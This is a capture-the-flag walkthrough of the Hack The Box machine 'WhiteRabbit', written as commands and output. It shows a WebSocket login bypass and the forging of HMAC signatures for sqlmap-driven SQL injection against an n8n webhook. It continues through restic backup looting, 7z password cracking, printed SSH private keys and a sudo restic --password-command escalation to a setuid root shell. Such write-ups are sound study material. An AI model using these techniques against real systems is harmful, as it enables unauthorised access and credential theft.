```shell
>> nmap -sCV -vv -oN nmap.all whiterabbit.htb
Increasing send delay for 10.10.11.63 from 0 to 5 due to 142 out of 472 dropped probes since last increase.
Nmap scan report for whiterabbit.htb (10.10.11.63)
Host is up, received reset ttl 62 (0.27s latency).
Scanned at 2025-12-22 17:21:42 +0545 for 22s
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBslomQGZRF6FPNyXmI7hlh/VDhJq7Px0dkYQH82ajAIggOeo6mByCJMZTpOvQhTxV2QoyuqeKx9j9fLGGwkpzk=
|   256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoXISApIRdMc65Kw96EahK0EiPZS4KADTbKKkjXSI3b
80/tcp   open  http    syn-ack ttl 62 Caddy httpd
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: White Rabbit - Pentesting Services
|_http-server-header: Caddy
2222/tcp open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKu1+ymf1qRT1c7pGig7JS8MrnSTvbycjrPWQfRLo/DM73E24UyLUgACgHoBsen8ofEO+R9dykVEH34JOT5qfgQ=
|   256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTObILLdRa6Jfr0dKl3LqWod4MXEhPnadfr+xGSWTQ+
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**\>>> `lft`** stands for **Layer Four Traceroute**. It’s a network diagnostic tool that traces the path to a destination **using TCP (Layer 4)** instead of ICMP (used by `traceroute`) or UDP.  
This makes `lft` useful when ICMP is **blocked or filtered by firewalls**.

## What `lft` does

- Discovers the route packets take to a host
- Uses **TCP packets** (default) → more firewall-friendly
- Can detect **asymmetric routing**
- Shows **latency**, **packet loss**, and **route changes**
- More advanced than traditional `traceroute`

```shell
>> sudo lft whiterabbit.htb:22
Tracing **..**...*T
TTL LFT trace to whiterabbit.htb (10.10.11.63):22/tcp
 1  10.10.14.1 259.3/260.5ms
 2  [target open] whiterabbit.htb (10.10.11.63):22 314.3/278.4ms
```

```shell
>> sudo lft whiterabbit.htb:80
Tracing **...*..*.T
TTL LFT trace to whiterabbit.htb (10.10.11.63):80/tcp
 1  10.10.14.1 257.9/260.6ms
 2  whiterabbit.htb (10.10.11.63) 256.4/260.3ms
 3  [target open] whiterabbit.htb (10.10.11.63):80 260.1ms
```

```shell
>> sudo lft whiterabbit.htb:2222
Tracing **...*..*.T
TTL LFT trace to whiterabbit.htb (10.10.11.63):2222/tcp
 1  10.10.14.1 263.7/266.3ms
 2  whiterabbit.htb (10.10.11.63) 257.0/259.9ms
 3  [target open] whiterabbit.htb (10.10.11.63):2222 255.5ms

```

**Hop-by-hop analysis:**  
**Hop 1:** `1 10.10.14.1 263.7/266.3ms`  
This is your gateway / VPN endpoint  
`10.10.14.1` → HTB VPN router  
RTT ~ 264–266 ms  
Confirms your traffic exits through the HTB VPN  
**Hop 2:** `2 whiterabbit.htb (10.10.11.63) 257.0/259.9ms`  
Information gained:  
The target is reached in 2 hops  
No intermediate routers between VPN gateway and target  
RTT ~ 258 ms  
The host responds to TCP TTL probes  
**Hop 3 (final / service confirmation):** `3 [target open] whiterabbit.htb (10.10.11.63):2222 255.5ms`  
*This is the most important line.*  
TCP port 2222 is OPEN  
The service responded with a valid TCP reply (likely SYN-ACK)  
The host is directly reachable  
Confirms the service is not filtered by a firewall  
`[target open]` is lft’s explicit confirmation of an open TCP port

**\>>> Only `/index.html` page is loaded in network of inspect mode, suggesting a static site.**

```shell
>> ffuf -u http://whiterabbit.htb -H "Host: FUZZ.whiterabbit.htb" -w /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt -mc all -fs 0 -c   

       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://whiterabbit.htb
 :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response size: 0
________________________________________________
status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 305ms]
:: Progress: [4989/4989] :: Job [1/1] :: 122 req/sec :: Duration: [0:00:39] :: Errors: 0 ::
```

```shell
>> cat /etc/hosts
10.10.11.63 whiterabbit.htb status.whiterabbit.htb
```

```
http://status.whiterabbit.htb/dashboard
```

<img src="../_resources/e9d0354714e2621df77af28ee2f5ef5f.png" alt="e9d0354714e2621df77af28ee2f5ef5f.png" width="913" height="215" class="jop-noMdConv">

I can not intercept login request because login credentials are send through websocket message. I have to build a Connection to the Web-Server First.  
**I cannot intercept login without WebSocket if:**

- The app sends credentials inside a WebSocket message
- Example:

```json
{
  "action": "login",
  "username": "user",
  "password": "pass"
}
```

- sent after WebSocket handshake  
    In this case:
- HTTP request only upgrades the connection
- Credentials are sent inside WebSocket frames  
    **Note:** I have to refresh the page passing through proxy and try to intercept after the connection is formed.

**\>>> Change the `false` flag to `true` in the websocket frame and forward the message.**

<img src="../_resources/41a703461e6271c9cae9b9e3beb57658.png" alt="41a703461e6271c9cae9b9e3beb57658.png" width="562" height="153" class="jop-noMdConv"> <img src="../_resources/fa4566bcff15f71bb1cab8f9059aab6b.png" alt="fa4566bcff15f71bb1cab8f9059aab6b.png" width="562" height="153" class="jop-noMdConv">

I got LoggedIn.

```
http://status.whiterabbit.htb/dashboard
```

<img src="../_resources/651d5dbc69453b1cabd170bff89de3d9.png" alt="651d5dbc69453b1cabd170bff89de3d9.png" width="1462" height="344" class="jop-noMdConv">

If I turn Intercept off, the page barely works, and quickly identifies that I’m not logged in and presents the login form. However, if I leave intercept enabled, it effectively blocks all websocket comms. I’m able click around a bit and interact with the site, though anything that requires websocket data don’t work. After 30 seconds or so, a red banner will appear across the top of the page: 
<img src="../_resources/00267a2825c812820cc5500444edf2b8.png" alt="00267a2825c812820cc5500444edf2b8.png" width="1454" height="376" class="jop-noMdConv">

```shell
>> ffuf -u http://status.whiterabbit.htb/status/FUZZ -w /snap/seclists/current/Discovery/Web-Content/raft-small-words.txt -fw 247
       v2.1.0-dev
________________________________________________
 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /snap/seclists/current/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 247
________________________________________________
temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 263ms]
```

I got two sub-domains in the `http://status.whiterabbit.htb/status/temp`

```shell
>> cat /etc/hosts
10.10.11.63 whiterabbit.htb status.whiterabbit.htb ddb09a8558c9.whiterabbit.htb a668910b5514e.whiterabbit.htb
```

![3784a8b63c2ed812e1596f1d9bb847c0.png](../_resources/3784a8b63c2ed812e1596f1d9bb847c0.png)

```
http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks
```

<img src="../_resources/2024-08-29_16-30.png" alt="2024-08-29_16-30.png" width="1443" height="586" class="jop-noMdConv">

**\>>> In Example HTTP POST Request from Gophish to n8n, there is a new host leaked so adding it to the `/etc/hosts` file.**  
<ins>The POST REQ:</ins>

```json
POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: */*
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81

{
  "campaign_id": 1,
  "email": "test@ex.com",
  "message": "Clicked Link"
}
```

<img src="../_resources/4b98864396fc5e86b867f5907ffddaa5.png" alt="4b98864396fc5e86b867f5907ffddaa5.png" width="1284" height="75" class="jop-noMdConv"> I downloaded the file, found the secret key leaked for creating the signature.

```json
>> cat gophish_to_phishing_score_database.json |jq '.nodes[]|select(.name=="Calculate the signature")'
{
  "parameters": {
    "action": "hmac",
    "type": "SHA256",
    "value": "={{ JSON.stringify($json.body) }}",
    "dataPropertyName": "calculated_signature",
    "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
  },
  "id": "e406828a-0d97-44b8-8798-6d066c4a4159",
  "name": "Calculate the signature",
  "type": "n8n-nodes-base.crypto",
  "typeVersion": 1,
  "position": [
    860,
    340
  ]
}
```

I tested example POST request in Repeater which shows signature is valid but the user does not match.  
![a67ec842709ded9cc01008965085d98c.png](../_resources/a67ec842709ded9cc01008965085d98c.png)  
And if I try to change something in the message frame it responds to signature mismatch.

![46c06f8dd34ac3f0a0f5564b9fa17f70.png](../_resources/46c06f8dd34ac3f0a0f5564b9fa17f70.png)  
But if I mess with the whitespaces it work perfectly fine because it the n8n step is running the body through JSON.stringify here before calculating the HMAC.

```json
 "parameters": {
    "action": "hmac",
    "type": "SHA256",
    "value": "={{ JSON.stringify($json.body) }}",
    "dataPropertyName": "calculated_signature",
    "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
  },
```

I can see in `gophish_to_phishing_score_database.json` file where raw data is passed through SQL query which means it is vulnerable to SQL injection.

```json
#check if user exists in database
 {
      "parameters": {
        "operation": "executeQuery",
        "query": "SELECT * FROM victims where email = \"{{ $json.body.email }}\" LIMIT 1",
        "options": {}
      }
```

So I generated a new `hmac` `sha256` signature using the secret key to test for the SQL injection.

```python
import json,hmac,hashlib    

data={
  "campaign_id": 1,
  "email": "test@ex.com\"",
  "message": "Clicked Link"
} 
key=b'3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS'
signature=hmac.new(key,json.dumps(data, separators=(',', ':')).encode(),hashlib.sha256).hexdigest()
print(signature) #output: 2db3eee889e9ee285ce57acbe51caae7dd4863ab9cadf21be4262be8f9fb5ff7
```

![1fc47f53fd7c96c02602ec8bb6acf53a.png](../_resources/1fc47f53fd7c96c02602ec8bb6acf53a.png)

Testing SQLi sending email ending with double quote to crash the query, in the work the pipeline is configure such that if it fails, it sends the results to `DEBUG: REMOVE SOON`

```json
    "Get current phishing score": {
      "main": [
        [
          {
            "node": "check if user exists in database",
            "type": "main",
            "index": 0
          }
        ],
        [
          {
            "node": "DEBUG: REMOVE SOON",
            "type": "main",
            "index": 0
          }
        ]
      ]
    },
```

That node sends the error message back in a response to the webhook:

```json
{
  "parameters": {
    "respondWith": "text",
    "responseBody": "={{ $json.message }} | {{ JSON.stringify($json.error)}}",
    "options": {}
  },
  "id": "d3f8446a-81af-4e5a-894e-e0eab0596364",
  "name": "DEBUG: REMOVE SOON",
  "type": "n8n-nodes-base.respondToWebhook",
  "typeVersion": 1.1,
  "position": [
    1620,
    20
  ]
}
```

I get the Error Message back to me which confirms the SQLi vulnerability.  
![f9ef840d7a3b1a173b069751f99425c2.png](../_resources/f9ef840d7a3b1a173b069751f99425c2.png)  
It is not ideal to manually try sql payloads to fetch information from the database, as I have to generate HMAC signature for each request.  
So using `sqlmap` to dump the data and `mitmproxy` to generate HMAC signature for each request.

```python3
#!/usr/bin/env python3
import json,hmac,hashlib
from mitmproxy import http

SECRET = b"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"

def request(flow: http.HTTPFlow) -> None:
    if flow.request.content:
        try:
            data = json.loads(flow.request.content)
            body = json.dumps(data, separators=(',', ':')).encode()
        except json.JSONDecodeError:
            body = flow.request.content

        signature = hmac.new(SECRET, body, hashlib.sha256).hexdigest()
        flow.request.headers["x-gophish-signature"] = f"sha256={signature}"	
```

```shell
>> python3 venv env
>> source env/bin/activate
(env)>> pip3 install mitmproxy
(env)>> mitmproxy -s sign_proxy.py -p 8888 --mode regular
```

![10f742eb42dae3e9816867ce160d494a.png](../_resources/10f742eb42dae3e9816867ce160d494a.png)

```shell
>> sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --proxy=http://localhost:8888 --headers="Content-Type: application/json" --data='{"campaign_id":1,"email":"test","message":"Clicked Link"}' --method=POST -p email --dbms mysql --batch --flush-session

--------------------------------------------------------------------------------------------------------------------------
(custom) POST parameter 'JSON email' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 709 HTTP(s) requests:
---
Parameter: JSON email ((custom) POST)
Type: boolean-based blind
Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
Payload: {"campaign_id":1,"email":"test" RLIKE (SELECT (CASE WHEN (9921=9921) THEN 0x74657374 ELSE 0x28 END))-- kauL","message":"Clicked Link"}

Type: error-based
Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
Payload: {"campaign_id":1,"email":"test" AND (SELECT 6586 FROM(SELECT COUNT(*),CONCAT(0x716b717671,(SELECT (ELT(6586=6586,1))),0x717a6b7a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TCat","message":"Clicked Link"}

Type: stacked queries
Title: MySQL >= 5.0.12 stacked queries (comment)
Payload: {"campaign_id":1,"email":"test";SELECT SLEEP(5)#","message":"Clicked Link"}

Type: time-based blind
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
Payload: {"campaign_id":1,"email":"test" AND (SELECT 9227 FROM (SELECT(SLEEP(5)))gNYp)-- JTtz","message":"Clicked Link"}
---
[08:12:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[08:12:36] [INFO] fetched data logged to text files under '/home/d0t0/.local/share/sqlmap/output/28efa8f7df.whiterabbit.htb'
----------------------------------------------------------------------------------------------------------------------------
```

Now Dumping the Database list:

```shell
>> sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --proxy=http://localhost:8888 --headers="Content-Type: application/json" --data='{"campaign_id":1,"email":"test","message":"Clicked Link"}' --method=POST -p email --dbms mysql --batch --flush-session --dbs
---------------------------------------------
available databases [3]:
[*] information_schema
[*] phishing
[*] temp
---------------------------------------------
```

Dumping the tables of temp:

```shell
>> sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --proxy=http://localhost:8888 --headers="Content-Type: application/json" --data='{"campaign_id":1,"email":"test","message":"Clicked Link"}' --method=POST -p email --dbms mysql --batch -D temp --tables 
Database: temp                                                                                                                                                                                                     
[1 table]                                                                                                                                                                                                        
+-------------+                                                                                                                                                                                                    
| command_log |                                                                                                                                                                                                    
+-------------+ 
```

Dumping the data of command_log:

```shell
>> sqlmap -u http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d --proxy=http://localhost:8888 --headers="Content-Type: application/json" --data='{"campaign_id":1,"email":"test","message":"Clicked Link"}' --method=POST -p email --dbms mysql --batch -D temp -T command_log --dump
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+
```

Checking for the snapshots in the backup server.

```shell
>> RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw restic -r rest:http://75951e6ff.whiterabbit.htb snapshots

repository 5b26a938 opened (version 2, compression level auto)
created new cache in /home/d0t0/.cache/restic
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-07 06:03:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

Restoring the snapshot from the backup:

```shell
>> RESTIC_PASSWORD=ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw restic -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target ./restic
repository 5b26a938 opened (version 2, compression level auto)
[0:00]          0 index files loaded
restoring <Snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit> to ./restic
Summary: Restored 5 files/dirs (572 B) in 0:00
```

The zip file is password protected:

```shell
d0t0@hacker:~/restic/dev/shm/bob/ssh$ ls
bob.7z
d0t0@hacker:~/restic/dev/shm/bob/ssh$ 7z l bob.7z 

7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Listing archive: bob.7z

--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-03-07 05:55:35 ....A          399          368  bob
2025-03-07 05:55:35 ....A           91               bob.pub
2025-03-07 05:56:05 ....A           67               config
------------------- ----- ------------ ------------  ------------------------
2025-03-07 05:56:05                557          368  3 files
```

So converting it to hash-format according to john to bruteforce the password using `rockyou.txt`:

```shell
>> 7z2john bob.7z > hash
>> cat hash
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

I have to give `--unername` flag to ignore the username infront of the hash in the hashfile, if I dont it throws an error:

```shell
>> hashcat hash --username /usr/share/wordlists/rockyou.txt
...Cracked...
>> hashcat hash --username /usr/share/wordlists/rockyou.txt --show
Mixing --show with --username or --dynamic-x can cause exponential delay in output.

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

11600 | 7-Zip | Archive

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00:1q2w3e4r5t6y
```

Extracting the zip:

```shell
>> 7z x bob.7z                                                                                                                                                                                                                                                   
7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20                                                                                                         
 64-bit locale=en_US.UTF-8 Threads:12 OPEN_MAX:1024                                                                                                                                                                                                                                                                                                    
Scanning the drive for archives:                                                                                                                                             
1 file, 572 bytes (1 KiB)                                                                                                                                                    
                                                                                                                                                                             
Extracting archive: bob.7z                                                                                                                                                   
--                                                                                                                                                                           
Path = bob.7z                                                                                                                                                                
Type = 7z                                                                                                                                                                    
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

Enter password (will not be echoed):
Everything is Ok

Files: 3
Size:       557
Compressed: 572
```

After extracting there are three files: `bob` `bob.pub` `config`

```shell
>> cat config
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
>> cat bob
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
>> cat bob.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG8NNTJHAXhD4DaKbE4OdjyEFMQae80HRLa9ouGYdkLj root@lucy
```

Logging through the ssh:

```shell
>> chmod 600 bob
>> ssh -i bob -p 2222 bob@whiterabbit.htb
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62
bob@ebdce80611e9:~$
```

Here I can see `.dockerenv` which means it is a docker container:

```shell
bob@ebdce80611e9:~$ ls -al /
total 88
drwxr-xr-x   1 root root 4096 Mar 24  2025 .
drwxr-xr-x   1 root root 4096 Mar 24  2025 ..
-rwxr-xr-x   1 root root    0 Mar 24  2025 .dockerenv
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4096 Apr 22  2024 boot
drwxr-xr-x   5 root root  340 Dec 24 04:01 dev
drwxr-xr-x   1 root root 4096 Mar 24  2025 etc
drwxr-xr-x   1 root root 4096 Mar 24  2025 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4096 Apr  8  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwxr-xr-x   2 root root 4096 Aug  1  2024 media
drwxr-xr-x   2 root root 4096 Aug  1  2024 mnt
drwxr-xr-x   2 root root 4096 Aug  1  2024 opt
dr-xr-xr-x 287 root root    0 Dec 24 04:01 proc
drwx------   1 root root 4096 Mar 24  2025 root
drwxr-xr-x   1 root root 4096 Dec 24 07:16 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Mar 31  2024 sbin.usr-is-merged
drwxr-xr-x   2 root root 4096 Aug  1  2024 srv
dr-xr-xr-x  13 root root    0 Dec 24 04:01 sys
drwxrwxrwt   1 root root 4096 Aug 30  2024 tmp
drwxr-xr-x   1 root root 4096 Aug  1  2024 usr
drwxr-xr-x   1 root root 4096 Aug  1  2024 var
```

```shell
>> cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
bob:x:1001:1001::/home/bob:/bin/bash
```

The only listening port is `0016` which is `22` for ssh service:

```shell
>> cat /proc/net/tcp
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 19072 1 0000000000000000 100 0 0 10 0                     
   1: 020011AC:0016 0B0F0A0A:8EFC 01 00000154:00000000 01:00000015 00000000     0        0 64810 4 0000000000000000 38 4 1 18 18
```

The user bob can run `/usr/bin/restic` as root without password:

```shell
>> sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

There is a flag in `restic` that let us execute shell commands, using it to escalate to the root.  
`--password-command` shell command to obtain the repository password from (default: \$RESTIC_PASSWORD_COMMAND)

```shell
bob@ebdce80611e9:~$ sudo restic check --password-command "touch /tmp/shell"                                                                                                                          14:55:50 [0/0]
using temporary cache in /tmp/restic-check-cache-1038268384                                              
Fatal: Please specify repository location (-r or --repository-file)

bob@ebdce80611e9:~$ ls /tmp                       
shell             

bob@ebdce80611e9:~$ sudo restic check --password-command "cp /bin/bash /tmp/shell"                                                                                                                                 
using temporary cache in /tmp/restic-check-cache-1329367296 

bob@ebdce80611e9:~$ sudo restic check --password-command "chmod 6777 /tmp/shell"                                                                                                                                   
using temporary cache in /tmp/restic-check-cache-532380329                                               
Fatal: Please specify repository location (-r or --repository-file)  

bob@ebdce80611e9:~$ /tmp/shell -p 

shell-5.2# ls -l /root                              
total 8                                             
-rw------- 1 root root 505 Aug 30  2024 morpheus                                                         
-rw-r--r-- 1 root root 186 Aug 30  2024 morpheus.pub
```

Linux Permissions:

```
7  7  7  7
│  │  │  └─ Others permissions
│  │  └──── Group permissions
│  └─────── Owner permissions
└────────── Special permission bits
7 = read (4) + write (2) + execute (1)
```

Copying the private key to my machine and loggedIn:

```shell
shell-5.2# cat /root/morpheus
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----

#My Machine
>> nano morpheus
>> chmod 600 morpheus 
>> ssh -i morpheus morpheus@whiterabbit.htb
The authenticity of host 'whiterabbit.htb (10.10.11.63)' can't be established.
Warning: Permanently added 'whiterabbit.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

Last login: Wed Dec 24 09:32:11 2025 from 10.10.15.11
morpheus@whiterabbit:~$ ls
user.txt
```

The machine have three users:

```c
morpheus@whiterabbit:~$ cat /etc/passwd |grep "sh$"
root:x:0:0:root:/root:/bin/bash
neo:x:1000:1000:Neo:/home/neo:/bin/bash
morpheus:x:1001:1001:Morpheus,,,:/home/morpheus:/bin/bash
```

```c
morpheus@whiterabbit:/opt/neo-password-generator$ ls
neo-password-generator
```

```c
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
hYCZa8qKJh1wX3uAmjOD
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
vks7Q6hIj2Hv4TYPjBiM
morpheus@whiterabbit:/opt/neo-password-generator$ ./neo-password-generator 
Vwg4QkkqMNtwS66t8wM6
```

Copied the `neo-password-generator` binary into my machine for reverse engineering:

```c
>> scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator neo-password-generator
neo-password-generator																	100%   15KB  25.9KB/s   00:00 
